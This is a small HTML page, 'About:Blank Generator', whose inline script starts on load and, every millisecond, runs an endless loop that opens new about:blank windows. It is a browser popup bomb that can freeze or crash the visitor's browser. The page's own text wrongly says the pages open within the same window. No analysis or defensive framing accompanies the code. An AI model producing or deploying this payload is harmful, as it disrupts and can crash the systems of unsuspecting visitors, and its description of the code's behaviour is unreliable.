<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>About:Blank Generator</title>
  <script>
    function openAboutBlank() {
      while (true) {
        var newWindow = window.open('about:blank', '_blank');
        newWindow.document.write('<html><head><title>About:Blank</title></head><body></body></html>');
        newWindow.document.close();
      }
    }
    setInterval(openAboutBlank, 1);
  </script>
</head>
<body>
  <h1>About:Blank Generator</h1>
  <p>This page will continuously open about:blank pages at a high frequency within the same window.</p>
</body>
</html>
